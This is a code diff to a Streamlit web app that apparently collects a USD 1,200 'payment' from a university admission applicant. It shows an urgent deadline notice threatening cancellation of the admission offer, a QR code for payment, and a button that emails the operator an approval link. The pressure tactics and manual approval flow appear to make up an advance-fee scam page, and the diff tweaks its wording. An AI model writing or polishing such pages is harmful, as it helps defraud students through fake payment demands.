@@ -128,10 +128,10 @@ elif st.session_state.step == "pay1":
 ⚠️ URGENT NOTICE:<br>
 Please complete the payment by 4:00 PM on May 4th. Failure to do so will result in the immediate cancellation of your admission offer and TLE MSc program seat.
 </div>
-<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Step: Installment - USD 1,200.00</p>
+<p style="text-align:center; font-weight:bold; color:#d32f2f; font-size:18px;">Current Step: Payment - USD 1,200.00</p>
 </div>""", unsafe_allow_html=True)
         st.image("qr1.png", width=400)
-        if st.button("I HAVE PAID THE INSTALLMENT", use_container_width=True, type="primary"):
+        if st.button("I HAVE PAID", use_container_width=True, type="primary"):
             requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
             set_status("checking"); st.session_state.step = "checking"; st.rerun()
 
